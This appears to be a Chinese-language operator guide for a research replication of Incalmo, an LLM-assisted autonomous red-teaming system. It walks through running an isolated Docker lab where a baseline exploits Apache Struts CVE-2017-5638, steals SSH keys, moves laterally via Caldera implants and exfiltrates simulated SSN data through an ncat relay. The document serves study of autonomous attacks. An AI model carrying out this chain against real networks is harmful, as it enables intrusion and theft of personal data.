# Incalmo 项目验收指南

> **写给导师的操作手册。**
> 本指南逐步演示论文复刻项目的核心成果：一个自主攻击系统在隔离 Docker 网络中，
> 全自动完成"入侵 → 横向移动 → 数据外泄"的完整攻击链，并将 10000 条模拟 SSN 数据偷出。
>
> 估计时间：首次约 15–20 分钟（大部分是等待），之后约 5 分钟。
> 要求：macOS（Apple Silicon M1/M2），已装 Docker Desktop。

---

## 背景：这个项目在做什么

本项目复刻论文 **Incalmo: An Autonomous LLM-assisted System for Red Teaming Multi-Host Networks**（arXiv 2501.16466）。

论文的核心思想是：让 AI 自主攻破一个企业内网，分两层：
- **规划层**：LLM（Claude）决定下一步做什么（扫描 / 横移 / 偷数据）
- **执行层**：确定性程序可靠地执行具体命令，不让 LLM 直接敲命令

本次验收展示的是**执行层（Deterministic Baseline）**已跑通的结果：
在论文 Equifax 场景的 Docker 等价靶场中，程序全自动走完整条攻击链。

### 靶场网络拓扑（论文 Equifax 场景，图 9）

```
外网 extnet (10.0.0.0/24)          内网 intnet (192.168.1.0/24，无外网出口)
                                         仅 webserver 和 database 能互通
[attacker 10.0.0.50] ──► [webserver 10.0.0.2/192.168.1.2] ──► [database 192.168.1.100]
     攻击者容器                双网卡，唯一跳板                    数据库，锁内网
     跑攻击代码                                                  存 10000 条 SSN
```

**关键约束（忠于论文）**：
- database 完全锁在内网，**无法直接联系攻击者**，数据外泄必须经 webserver 中转
- 命令通过 **Caldera C&C**（MITRE 开源的红队指挥框架）下发，入侵一次后不再重新利用漏洞
- 攻击路径由**攻击图服务**动态计算，不硬编码

### 攻击链四步

| 步骤 | 动作 | 技术 |
|------|------|------|
| 1 | 入侵 webserver | CVE-2017-5638 Apache Struts RCE |
| 2 | 在 webserver 翻凭据 | 读 `~/.ssh/config` + 私钥 |
| 3 | 用凭据横移到 database | 偷来的 SSH 密钥 |
| 4 | 外泄数据（多跳）| DB→web(ncat中继)→attacker HTTP 推送 |

---

## 第 1 步：启动 Docker Desktop

打开 Finder → Applications → 双击 **Docker Desktop**

等菜单栏顶部的鲸鱼图标不再转圈（约 30 秒），然后确认：

```bash
docker ps
```

✅ 期望：看到 `CONTAINER ID IMAGE ...` 表头（即使没有容器，有表头就说明 Docker 正常）

❌ 如果看到 `Cannot connect to the Docker daemon`：Docker Desktop 还没启动完，再等 30 秒重试

---

## 第 2 步：启动 Caldera（C&C 指挥部）

**Caldera 是什么**：MITRE 开发的开源红队指挥框架。本项目用它作为 C&C 服务器——一旦在靶机里装上"内应程序"（Sandcat agent），之后所有命令都通过它下发，不需要反复利用漏洞。这是论文的核心设计之一。

### 2-1 检查 Caldera 容器状态

```bash
docker ps -a --filter name=caldera --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
```

---

**情况 A：看到 `Up` 且端口有 `8888`（正在运行）**

```
NAMES     STATUS        PORTS
caldera   Up 2 hours    0.0.0.0:8888->8888/tcp
```

→ 直接跳到 **2-2 验证 API**

---

**情况 B：看到 `Exited`（容器存在但已停止）**

```
NAMES     STATUS
caldera   Exited (1) 3 hours ago
```

→ 重启它：

```bash
docker start caldera
sleep 20
```

→ 跳到 **2-2 验证 API**

---

**情况 C：什么都没有（只有表头，全新状态）**

```
NAMES   STATUS   PORTS
```

→ 启动（用项目已有的 caldera 镜像）：

```bash
docker run -d \
  --name caldera \
  -p 8888:8888 \
  -p 8443:8443 \
  caldera:server \
  --insecure

sleep 25
```

→ 继续 **2-2 验证 API**

---

### 2-2 验证 Caldera API 正常

```bash
curl -s -H "KEY: ADMIN123" http://localhost:8888/api/v2/agents \
  | python3 -c "import json,sys; a=json.load(sys.stdin); print(f'Caldera OK — {len(a)} agents')"
```

✅ 期望：`Caldera OK — 0 agents`（或几个数字，不影响）

❌ 如果报错或返回空：Caldera 还没完全启动，等 10 秒再试一次

---

## 第 3 步：进入项目目录

```bash
cd /Users/chenqi/Desktop/Incalmo
```

之后所有命令都在这个目录下执行。

---

## 第 4 步：启动靶场网络

**这一步做什么**：用 Docker Compose 同时起三台"虚拟机"：
- `attacker`（攻击者）：运行攻击代码，在外网 10.0.0.50
- `webserver`（入口）：运行有漏洞的 Apache Struts 网站，双网卡（外网+内网）
- `database`（目标）：存有 10000 条 SSN 数据，锁在内网

### 4-1 检查靶场状态

```bash
docker ps --format "table {{.Names}}\t{{.Status}}" | grep equifax
```

---

**情况 A：看到三行都是 `Up`（已在运行）**

```
equifax-seg-attacker-1    Up 10 minutes
equifax-seg-database-1    Up 10 minutes
equifax-seg-webserver-1   Up 10 minutes
```

→ 直接跳到 **第 5 步**

---

**情况 B：看到平网容器（名字里没有 `-seg-`）**

```
equifax-webserver-1   Up ...
equifax-database-1    Up ...
```

→ 先停它：

```bash
cd /Users/chenqi/Desktop/Incalmo/equifax
docker compose down
```

→ 然后按情况 C 启动分段网

---

**情况 C：没有任何 equifax 容器（全新）**

```bash
cd /Users/chenqi/Desktop/Incalmo/equifax
docker compose -f docker-compose.segmented.yml -p equifax-seg up -d --build
```

> 第一次构建需要 2–4 分钟（编译 webserver 等镜像），之后每次秒启。

等待完成后验证：

```bash
sleep 15
docker compose -f docker-compose.segmented.yml -p equifax-seg ps
```

✅ 期望：三行全是 `running`

---

## 第 5 步：部署 Caldera 植入体

**这一步做什么**：把 Caldera 的"内应程序"（Sandcat）装进 webserver 和 database。

具体来说：
1. 在 webserver 启动一个"中继 agent"（带 P2P 转发功能），它直接与 Caldera 联系
2. 把同一个二进制经 SSH 复制到 database，让 database 的 agent 经 webserver 中转回连 Caldera

这样做的原因：database 在内网，**无法直接联系 Caldera**，必须经 webserver 跳转——这正是论文要的隔离。

```bash
cd /Users/chenqi/Desktop/Incalmo
chmod +x equifax/redeploy_relay.sh
./equifax/redeploy_relay.sh
```

脚本自动完成 6 步（约 30 秒）。

✅ 期望最后几行：

```
=== final agents in relay groups ===
<paw1>  10.0.0.2        tomcat    2026-06-27T...
<paw2>  192.168.1.100   database  2026-06-27T...
```

两行都有 → 两台靶机都上线

❌ 只有一行（database 没出现）：等 15 秒 DB 通过中继回连，再查：

```bash
curl -s -H "KEY: ADMIN123" http://localhost:8888/api/v2/agents \
  | python3 -c "
import json, sys
for a in json.load(sys.stdin):
    print(a['group'], a['username'], a['last_seen'][:19])
"
```

看到 `192.168.1.100 database ...` 就可以继续

❌ 脚本报 `permission denied`：

```bash
chmod +x /Users/chenqi/Desktop/Incalmo/equifax/redeploy_relay.sh
/Users/chenqi/Desktop/Incalmo/equifax/redeploy_relay.sh
```

---

## 第 6 步：运行攻击

**这一步做什么**：在 attacker 容器里执行确定性攻击 baseline。程序按论文设计自动：
1. 通过攻击图服务计算路径（attacker → webserver → database）
2. 调用 Caldera 已部署的 webserver 植入体，读取 SSH 凭据
3. 用凭据通过 webserver 跳板横移到 database
4. 计算外泄路径（database → web ncat 中继 → attacker）
5. 在 webserver 起 ncat TCP 中继，database 把 data.json 经中继推到 attacker

```bash
cd /Users/chenqi/Desktop/Incalmo

docker compose -f equifax/docker-compose.segmented.yml \
  -p equifax-seg \
  exec -w /incalmo attacker \
  python -m incalmo.core.strategy.equifax_baseline
```

整个过程约 **3–5 分钟**（Caldera 每 3 秒轮询一次命令，节奏慢但可靠）。

✅ 期望输出（完整流程）：

```
[*] Graph-driven Equifax baseline execution started...

[CHECK] attack_hops = [('10.0.0.50', '10.0.0.2')]
[*] Orchestrating hop: From 10.0.0.50 -> Target: 10.0.0.2
[+] Successfully established initial access on: 10.0.0.2
[*] Gathering subsequent access credentials from 10.0.0.2...

[CHECK] attack_hops = [('10.0.0.50', '10.0.0.2'), ('10.0.0.2', '192.168.1.100')]
[*] Orchestrating hop: From 10.0.0.2 -> Target: 192.168.1.100
[+] Successfully completed lateral move to: 192.168.1.100
[+] Database compromised — lateral movement complete.

[CHECK] exfil_route = [('192.168.1.100', '10.0.0.2'), ('10.0.0.2', '10.0.0.50')]
[*] Starting exfil relay on webserver (192.168.1.2:9001) -> attacker (10.0.0.50:9000)...
[ExfilReceiver] listening on :9000
[ExfiltrateAgent] expected size: 3097051 bytes
[ExfiltrateAgent] received: 3097051 bytes
[+] Exfiltration complete: Exfiltrated 3097051 bytes from /home/database/data.json

[*] Compromised hosts list = ['10.0.0.2', '192.168.1.100']
[*] Output artifacts successfully saved to: /incalmo/output/<timestamp>/data.json
```

> 注：`curl status: Timeout reached` 不是错误——curl 命令通道 90 秒超时，
> 但数据在超时前已完整到达 ExfilReceiver（received = expected = 3097051 bytes）。

---

## 第 7 步：验收结果

```bash
# 查看偷出的文件
ls -lh /Users/chenqi/Desktop/Incalmo/output/*/data.json

# 统计行数（应为 10000 条数据 + 少量开头/结尾）
wc -l /Users/chenqi/Desktop/Incalmo/output/*/data.json

# 查看文件内容（前 3 行）
head -3 /Users/chenqi/Desktop/Incalmo/output/*/data.json
```

✅ 验收通过标准：
- 文件大小约 **3.0 MB**
- 数据约 **10000 条** SSN/信用卡模拟记录
- 两台主机被攻陷：`10.0.0.2`（webserver）和 `192.168.1.100`（database）

---

## 完成后清理

验收完毕后，释放资源：

```bash
cd /Users/chenqi/Desktop/Incalmo/equifax
docker compose -f docker-compose.segmented.yml -p equifax-seg down

docker stop caldera
```

---

## 附：常见问题

| 现象 | 原因 | 解决 |
|------|------|------|
| `docker ps` 报 `Cannot connect` | Docker Desktop 没开 | 打开 Docker Desktop，等图标稳定 |
| `Caldera OK` 报 JSON 错误 | Caldera 没跑 / 没启动完 | 跑 `docker start caldera && sleep 20` 再试 |
| `redeploy_relay.sh` 报 permission denied | 文件没有执行权限 | `chmod +x equifax/redeploy_relay.sh` |
| DB agent 没出现 | P2P 中继启动慢 | 等 15 秒后再查 agents |
| baseline 卡超过 5 分钟 | Caldera agent 掉线 | Ctrl+C → 重跑 redeploy_relay.sh → 重跑 baseline |
| output/ 没有文件 | ExfilReceiver 没收到数据 | 看 baseline 输出有没有 `Timed out` |

---

## 项目结构（供参考）

```
incalmo/
  core/
    agents/          # 5 个任务 agent（Scan/LateralMove/FindInfo/Escalate/Exfiltrate）
    services/        # 3 个支撑服务（环境状态/攻击图/C&C）
    actions/         # 命令原语（WebShell/SshRunner/CncRunner）
    models/          # 数据模型（Host/Credential/Subnet 等）
    strategy/        # 攻击总指挥（equifax_baseline.py）
equifax/
  docker-compose.segmented.yml   # 分段网靶场定义
  redeploy_relay.sh              # 一键部署 Caldera 植入体
  webserver/                     # 有漏洞的 Apache Struts 靶机
  database/                      # 存 10000 条 SSN 的数据库靶机
  attacker/                      # 攻击者容器（跑 Incalmo 代码）
output/                          # 偷出的数据落地在这里
```
